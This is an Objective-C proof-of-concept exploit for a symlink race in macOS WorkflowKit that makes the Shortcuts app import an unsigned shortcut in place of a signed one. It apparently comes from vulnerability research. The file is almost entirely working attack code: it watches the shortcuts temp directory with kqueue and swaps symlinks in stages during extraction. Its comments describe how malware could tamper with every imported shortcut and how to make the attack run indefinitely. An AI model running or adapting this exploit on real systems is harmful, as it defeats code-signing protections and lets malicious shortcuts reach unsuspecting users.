//
//  main.m
//  WorkflowKitSigningRace
//
//  Created by Snoolie Keffaber on 2024/03/26.
//

/*
 * WorkflowKitSigningRace
 *
 * The following is a PoC of a
 * vulnerability in WorkflowKit
 * exploitable on macOS in which
 * a malicious program can
 * intercept shortcut imports and
 * make WorkflowKit import an
 * unsigned Shortcut. In this PoC
 * the signed shortcut has to be
 * named "SIGNED_SHORTCUT_CONTACT"
 * and it only runs for 20 seconds,
 * but it's possible to have
 * it run for an indefinite amount
 * of time and work with all
 * signed shortcuts with minor
 * tweaking.
 *
 * For example, this vulnerability
 * can be used maliciously by a program
 * that while it runs in the background,
 * it makes all shortcuts imported be
 * modified to include malicious
 * behavior.
 *
 * This PoC exploit comes in 2/3 noticable stages:
 *
 * stage_0:
 * Not actually part of the race,
 * but rather prepares us for it.
 * Sets up the directories in
 * the shortcuts temp dir
 * that we will use in our
 * actual race.
 *
 * stage_1:
 * When a shortcut is being
 * imported, quickly make the
 * SIGNED_SHORTCUT_CONTACT.shortcuts
 * path a symlink that points to
 * the path where we will
 * actually use for extraction.
 * This is so we can improve
 * the reliability of stage_2.
 *
 * stage_2:
 * Immediately after the shortcut
 * begins extraction, changes the
 * SIGNED_SHORTCUT_CONTACT.shortcuts
 * symlink to to instead point to a path
 * that we have the unsigned shortcut
 * that will ACTUALLY be improrted!
 *
 * At least on my MacBook Air 2020 i5,
 * this seems to be incredibly reliable!
 */

/*
 * Here, you should put the path to
 * the unsigned shortcut that we're
 * going to intercept with the
 * signed shortcut that is being
 * imported.
 */
#define PATH_TO_UNSIGNED_SHORTCUT "/Users/0xilis/Downloads/0/GitGub/WorkflowKit-Ent-Testing/More/WorkflowKitSigningRace/Source/intercept/Shortcut.wflow"

#import <Foundation/Foundation.h>

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/event.h>
#include <sys/time.h>
#include <errno.h>
#include <string.h>
#include <inttypes.h>

#include <dirent.h>
#include <sys/stat.h>
 
#define NUM_EVENT_SLOTS 1
#define NUM_EVENT_FDS 1
 
char *flagstring(int flags);

__attribute__((always_inline)) static void stage_0(const char *shortcutsTempPath, const char *pathToUnsignedShortcut, const char *redirectPath, const char *pathToSaveOldSymlink, const char *stage2path) {
    /* Stage 0 */
    /* Not part of actual race but just prepares us for it */
    DIR *dir;
    struct dirent *ent;
    if ((dir = opendir(shortcutsTempPath)) == 0) {
        fprintf(stderr, "WorkflowKitSigningRace failed: opendir() in stage_0\n");
        exit(1);
    }
    
    while ((ent = readdir(dir))) {
        const char *dirName= ent->d_name;
        if (dirName[8] == '-') {
            closedir(dir);
            fprintf(stderr, "WorkflowKitSigningRace failed: shortcuts temp directory needs to be clean before PoC\n");
            exit(1);
        }
    }
    
    closedir(dir);
    
    mkdir(redirectPath, 0755);
    remove(pathToSaveOldSymlink);
    mkdir(stage2path, 0755);
    
    FILE *fp = fopen(pathToUnsignedShortcut, "r");
    if (!fp) {
        fprintf(stderr,"WorkflowKitSigningRace failed: could not read unsigned shortcut path for stage_0\n");
        exit(1);
    }
    const char *wflowPath = [[NSString stringWithFormat:@"%s/Shortcut.wflow",stage2path]UTF8String];
    if (!access(wflowPath, F_OK)) {
        /* File exists, delete it for new */
        remove(wflowPath);
    }
    FILE *fp_writeTo = fopen(wflowPath, "w");
    if (!fp_writeTo) {
        fprintf(stderr,"WorkflowKitSigningRace failed: could not open wflowPath for stage_0\n");
        exit(1);
    }
    /* copy pathToUnsignedShortcut to wflowPath */
    char c = fgetc(fp);
    while (c != EOF) {
        fputc(c, fp_writeTo);
        c = fgetc(fp);
    }
    fclose(fp);
    fclose(fp_writeTo);
    printf("stage_0 done\n");
}

__attribute__((always_inline)) static void stage_1(const char *path, const char *redirectPath) {
    /* Stage 1 */
    symlink(redirectPath,path);
}

__attribute__((always_inline)) static void stage_2(const char *path, const char *pathToSaveOldSymlink, const char *stage2path) {
    /* Stage 2 */
    /*
     * You may be asking, hey, why are we doing it this way?
     * Shouldn't we just be modifying Shortcut.wflow?
     * Well, the thing is, we can really only do that *after*
     * the AAArchiveStreamClose but before the WFFileRepresentation
     * creation; which while technically is still theoretically
     * possibly to exploit in that way, is near impossible;
     * have fun with a 0.01% reliably stage 2.
     * This is because if we modify it before
     * the AAExtractArchiveOutputStream finishes
     * it will make the operation fail.
     * So, how do we do this reliably?
     *
     * AAExtractArchiveOutputStreamOpen caches the
     * realpath of the directory, resolving symlinks.
     * This is the point of stage1; we make the directory
     * a symlink so it gets the real path and
     * modifies it. Sure, we change the path
     * later, but it still has the symlink
     * cached. This is so in stage2, we modify
     * the symlink to point to a different directory
     * that will have the unsigned shortcut that
     * Shortcuts will ACTUALLY import, but
     * AAExtractArchiveOutputStreamOpen is still
     * focused on whatever the symlink originally
     * pointed to and extract it there; drastically
     * increasing exploit reliability!
     */
    /* Get rid of current shortcut path */
    rename(path, pathToSaveOldSymlink);
    /* Replace with Stage2_Directory path. */
    symlink(stage2path,path);
    printf("stage 2 done\n");
}

void loop_until_stage_2(const char *directory, const char *pathToSaveOldSymlink, const char *stage2path) {
    const char *wflowPath = [[NSString stringWithFormat:@"%s/Shortcut.wflow",directory]UTF8String];
#define SPAM_ACCESS_CALL 100000
    for (unsigned int i = 0; i < SPAM_ACCESS_CALL; i++) {
        /* AAExtractArchive should be writing to the symlink at the time anyway to hopefully this is fine, explained in more depth in comment in stage_2() */
        if (!access(wflowPath, F_OK)) {
            stage_2(directory, pathToSaveOldSymlink, stage2path);
            NSLog(@"stage 2 finished!!");
            break;
        }
    }
    printf("finished loop\n");
    NSLog(@"finish");
}

void cleanup(const char *path) {
    /* Wait 1 second to ensure extraction completed */
    sleep(1);
    
    /* Cleanup after exploit */
    DIR *dir;
    struct dirent *ent;
    if ((dir = opendir(path)) == 0) {
        fprintf(stderr, "WorkflowKitSigningRace failed: opendir() in cleanup??\n");
        return;
    }
    
    while ((ent = readdir(dir))) {
        const char *dirName= ent->d_name;
        if (dirName[8] == '-') {
            /* assume dir is uuid and remove it */
            printf("WorkflowKitSigningRace removing: %s\n",dirName);
            remove(dirName);
        }
    }
    
    closedir(dir);
    printf("WorkflowKitSigningRace cleanup done\n");
}
 
int main(int argc, char *argv[])
{
    printf("start\n");
    
    /* Get shortcuts temp path */
    NSString *tempDir = NSTemporaryDirectory();
    if (!tempDir) {
        fprintf(stderr,"WorkflowKitSigningRace failed: could not get temporary directory\n");
        return -1;
    }
    NSArray *paths = [tempDir stringsByAppendingPaths:@[@"com.apple.shortcuts"]];
    
    NSString *shortcutsTempPath = paths[0];
    NSArray *pathsToDirsForRace = [shortcutsTempPath stringsByAppendingPaths:@[@"RedirectExtractionToHere",@"Stage2_Directory",@"OldJunkSymlink"]];
    
    NSString *redirectPathString = pathsToDirsForRace[0];
    NSString *stage2PathString = pathsToDirsForRace[1];
    NSString *oldJunkSymlinkPathString = pathsToDirsForRace[2];
    
    NSLog(@"redirectPath %@",redirectPathString);
    NSLog(@"stage2Path %@",stage2PathString);
    NSLog(@"oldJunkSymlink %@",oldJunkSymlinkPathString);
    
    const char *redirectPath = [redirectPathString fileSystemRepresentation];
    const char *stage2Path = [stage2PathString fileSystemRepresentation];
    const char *oldJunkSymlinkPath = [oldJunkSymlinkPathString fileSystemRepresentation];
    const char *path = [shortcutsTempPath fileSystemRepresentation];
    
    const char *pathToOriginalShortcut = [[NSString stringWithFormat:@"%s/Shortcut.wflow",redirectPath]UTF8String];
    
    remove(pathToOriginalShortcut);
    
    /* Prepare for exploit */
    stage_0(path,PATH_TO_UNSIGNED_SHORTCUT, redirectPath, oldJunkSymlinkPath, stage2Path);
    
    int kq;
    int event_fd;
    struct kevent events_to_monitor[NUM_EVENT_FDS];
    struct kevent event_data[NUM_EVENT_SLOTS];
    struct timespec timeout;
    unsigned int vnode_events;
    
    /* Ugly hack */
    chdir(path);
 
    /* Open a kernel queue. */
    if ((kq = kqueue()) < 0) {
        fprintf(stderr, "Could not open kernel queue. Error was %s.\n", strerror(errno));
        exit(1);
    }
 
    /* Open shortcuts temp dir */
    event_fd = open(path, O_EVTONLY);
    if (event_fd <= 0) {
        fprintf(stderr, "The file %s could not be opened for monitoring. Error was %s.\n", path, strerror(errno));
        exit(1);
    }
 
    /* Set the timeout to wake us every half second for first iteration. */
    timeout.tv_sec = 0;        // 0 seconds
    timeout.tv_nsec = 500000000;    // 500 milliseconds
 
    /* Set up a list of events to monitor. */
    vnode_events = NOTE_DELETE |  NOTE_WRITE | NOTE_EXTEND |                            NOTE_ATTRIB | NOTE_LINK | NOTE_RENAME | NOTE_REVOKE;
    EV_SET( &events_to_monitor[0], event_fd, EVFILT_VNODE, EV_ADD | EV_CLEAR, vnode_events, 0, 0);
    
    /* Handle events. */
    int alreadyDidStage2 = 0;
    int continue_loop = 40000; /* Monitor for twenty seconds. */
    while (--continue_loop) {
        int event_count = kevent(kq, events_to_monitor, NUM_EVENT_SLOTS, event_data, 1, &timeout);
        if ((event_count < 0) || (event_data[0].flags == EV_ERROR)) {
            /* An error occurred. */
            fprintf(stderr, "An error occurred (event count %d).  The error was %s.\n", event_count, strerror(errno));
            break;
        }
        if (event_count) {
            printf("Event %" PRIdPTR " occurred.  Filter %d, flags %d, filter flags %s, filter data %" PRIdPTR ", path %s\n",
                event_data[0].ident,
                event_data[0].filter,
                event_data[0].flags,
                flagstring(event_data[0].fflags),
                event_data[0].data,
                (char *)event_data[0].udata);
            
            DIR *dir;
            struct dirent *ent;
            if ((dir = opendir(path)) == 0) {
                fprintf(stderr, "opendir() failed\n");
                close(event_fd);
                exit(-1);
            }
            
            while ((ent = readdir(dir))) {
                const char *dirName= ent->d_name;
                if (dirName[8] == '-') {
                    /*
                     * if you want to race without knowing
                     * the import name then just symlink the
                     * uuid directory instead of the .shortcuts
                     * dir should have exact same reliability
                     * it might cause some issues with
                     * other things in shortcuts that use
                     * the temp directory but malware
                     * probably won't care about that.
                     * however i do in this PoC so
                     * I'm assuming the name of the
                     * shortcut being imported.
                     */
                    printf("%s: \n",dirName);
                    if (!alreadyDidStage2) {
                        /* Stage 1 */
                        const char *shortcutsFilePath = [[NSString stringWithFormat:@"%s/%s/SIGNED_RESULT_CONTACT.shortcuts",path,dirName]UTF8String];
                        stage_1(shortcutsFilePath, redirectPath);
                        loop_until_stage_2(shortcutsFilePath, oldJunkSymlinkPath, stage2Path);
                        alreadyDidStage2 = 1;
                        if (access(pathToOriginalShortcut, F_OK)) {
                            fprintf(stderr,"WorkflowKitSigningRace failed: stage_1 was too slow\n");
                            closedir(dir);
                            close(event_fd);
                            exit(1);
                        }
                        cleanup(path);
                        closedir(dir);
                        close(event_fd);
                        printf("WorkflowKitSigningRace: stopped\n");
                        return 0;
                    }
                }
            }
            closedir(dir);
        }
 
        /* Reset the timeout.  In case of a signal interrruption, the
           values may change. */
        timeout.tv_sec = 0;        // 0 seconds
        timeout.tv_nsec = 500000;    // 0.5 milliseconds
    }
    close(event_fd);
    printf("WorkflowKitSigningRace: stage_1 timeout\n");
    return 0;
}
 
/* A simple routine to return a string for a set of flags. */
char *flagstring(int flags)
{
    static char ret[512];
    char *or = "";
 
    ret[0]='\0'; // clear the string.
    if (flags & NOTE_DELETE) {strcat(ret,or);strcat(ret,"NOTE_DELETE");or="|";}
    if (flags & NOTE_WRITE) {strcat(ret,or);strcat(ret,"NOTE_WRITE");or="|";}
    if (flags & NOTE_EXTEND) {strcat(ret,or);strcat(ret,"NOTE_EXTEND");or="|";}
    if (flags & NOTE_ATTRIB) {strcat(ret,or);strcat(ret,"NOTE_ATTRIB");or="|";}
    if (flags & NOTE_LINK) {strcat(ret,or);strcat(ret,"NOTE_LINK");or="|";}
    if (flags & NOTE_RENAME) {strcat(ret,or);strcat(ret,"NOTE_RENAME");or="|";}
    if (flags & NOTE_REVOKE) {strcat(ret,or);strcat(ret,"NOTE_REVOKE");or="|";}
 
    return ret;
}

